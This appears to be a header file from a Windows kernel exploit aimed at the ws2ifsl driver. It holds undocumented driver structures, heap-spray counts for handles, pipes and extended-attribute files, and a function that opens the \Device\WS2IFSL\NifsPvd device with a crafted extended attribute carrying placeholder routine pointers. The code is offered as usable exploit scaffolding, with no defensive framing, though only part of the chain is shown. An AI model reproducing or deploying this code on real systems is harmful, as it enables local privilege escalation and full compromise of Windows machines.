#pragma once

#include <Windows.h>
#include <winternl.h>
#include <iostream>

// ws2ifsl
// wdm.h
// 结构提供扩展属性 (EA) 信息
typedef struct _FILE_FULL_EA_INFORMATION
{
	ULONG NextEntryOffset;
	UCHAR Flags;
	UCHAR EaNameLength;
	USHORT EaValueLength;
	CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;

typedef struct _PROC_DATA
{
	HANDLE ApcThread;          // 0x00
	PVOID RequestQueueRoutine; // 0x04
	PVOID CancelQueueRoutine;  // 0x08
	PVOID ApcContext;          // 0x0C
	PVOID unknown3;            // 0x10
} PROC_DATA, * PPROC_DATA;

HANDLE g_hThreadApc;
const ULONG64 CountSprayWs2P = 0x100;
const ULONG64 CountSprayPipe = 0x100;
const ULONG64 CountSprayEaFile = 0x1000;
DWORD CountConcurrentSprayEaFile = 0x0; // set to cpu number later
const ULONG64 CountSprayMm = 0x1000;
HANDLE* hProcessList;

HANDLE CreateProcessHandle(HANDLE hThreadApc)
{
	UNICODE_STRING deviceName;
	RtlInitUnicodeString(&deviceName, (PWSTR)L"\\Device\\WS2IFSL\\NifsPvd");

	OBJECT_ATTRIBUTES object;
	InitializeObjectAttributes(&object, &deviceName, 0, NULL, NULL);

	PFILE_FULL_EA_INFORMATION pFileEa =
		(PFILE_FULL_EA_INFORMATION)malloc(sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA));

	if (pFileEa == NULL)
	{
		wprintf(L"Error malloc\r\n");
		exit(-1);
	}

	pFileEa->NextEntryOffset = 0;
	pFileEa->Flags = 0;
	pFileEa->EaNameLength = sizeof("NifsPvd") - 1;
	pFileEa->EaValueLength = sizeof(PROC_DATA);
	memcpy(pFileEa->EaName, "NifsPvd", pFileEa->EaNameLength + 1);

	PPROC_DATA pProcData = (PPROC_DATA)((char*)pFileEa + sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") - 4);
	pProcData->ApcThread = hThreadApc;
	pProcData->RequestQueueRoutine = (PVOID)0xaaaaaaaa;
	pProcData->CancelQueueRoutine = (PVOID)0xbbbbbbbb;
	pProcData->ApcContext = (PVOID)0xcccccccc;
	pProcData->unknown3 = (PVOID)0xdddddddd;

	HANDLE handle = INVALID_HANDLE_VALUE;
	IO_STATUS_BLOCK IoStatusBlock;

	// object -> handle
	NTSTATUS status = NtCreateFile(
		&handle,
		MAXIMUM_ALLOWED,
		&object,
		&IoStatusBlock,
		NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF,
		0,
		pFileEa,
		sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA)
	);
	if (NT_ERROR(status))
	{
		wprintf(L"Error NtCreateFile\r\n");
		free(pFileEa);
		exit(1);
	}
	free(pFileEa);
	return handle;
}